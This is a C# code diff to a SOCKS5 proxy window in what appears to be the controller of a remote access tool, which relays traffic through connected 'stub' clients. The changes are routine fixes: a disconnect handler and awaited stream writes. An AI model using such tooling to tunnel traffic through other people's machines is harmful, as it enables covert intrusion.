@@ -33,6 +33,7 @@ public partial class Socks5Window : ThemedWindow
         _server.RegisterHandler(clientId, PacketType.SocksConnErr, OnConnErr);
         _server.RegisterHandler(clientId, PacketType.SocksData,    OnData);
         _server.RegisterHandler(clientId, PacketType.SocksClose,   OnRemoteClose);
+        _server.ClientDisconnected += OnClientDisconnected;
 
         Lang.LanguageChanged += ApplyLanguage;
         ApplyLanguage();
@@ -43,8 +44,15 @@ public partial class Socks5Window : ThemedWindow
             _server.UnregisterHandler(clientId, PacketType.SocksConnErr);
             _server.UnregisterHandler(clientId, PacketType.SocksData);
             _server.UnregisterHandler(clientId, PacketType.SocksClose);
+            _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
         };
+    }
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        StopProxy(logStop: false);
     }
 
     // ── Start / Stop ────────────────────────────────────────────────────────
@@ -229,7 +237,7 @@ public partial class Socks5Window : ThemedWindow
 
     // ── Incoming from stub ───────────────────────────────────────────────────
 
-    private void OnConnOk(Packet pkt)
+    private async void OnConnOk(Packet pkt)
     {
         try
         {
@@ -237,16 +245,15 @@ public partial class Socks5Window : ThemedWindow
             if (d == null) return;
             if (_pending.TryGetValue(d.SessionId, out var client))
             {
-                // Send SOCKS5 success reply
                 var reply = new byte[] { 5, 0, 0, 1, 0, 0, 0, 0, 0, 0 };
-                try { _ = client.GetStream().WriteAsync(reply); } catch { }
+                try { await client.GetStream().WriteAsync(reply); } catch { }
                 AddLog($"[✓] {d.SessionId} connected");
             }
         }
         catch { }
     }
 
-    private void OnConnErr(Packet pkt)
+    private async void OnConnErr(Packet pkt)
     {
         try
         {
@@ -255,14 +262,14 @@ public partial class Socks5Window : ThemedWindow
             if (_pending.TryRemove(d.SessionId, out var client))
             {
                 var reply = new byte[] { 5, 4, 0, 1, 0, 0, 0, 0, 0, 0 }; // Host unreachable
-                try { _ = client.GetStream().WriteAsync(reply); client.Close(); } catch { }
+                try { await client.GetStream().WriteAsync(reply); client.Close(); } catch { }
             }
             AddLog($"[✗] {d.SessionId}: {d.Error}");
         }
         catch { }
     }
 
-    private void OnData(Packet pkt)
+    private async void OnData(Packet pkt)
     {
         try
         {
@@ -271,7 +278,7 @@ public partial class Socks5Window : ThemedWindow
             if (_pending.TryGetValue(d.SessionId, out var client))
             {
                 var bytes = Convert.FromBase64String(d.Data);
-                try { _ = client.GetStream().WriteAsync(bytes); } catch { }
+                try { await client.GetStream().WriteAsync(bytes); } catch { }
             }
         }
         catch { }
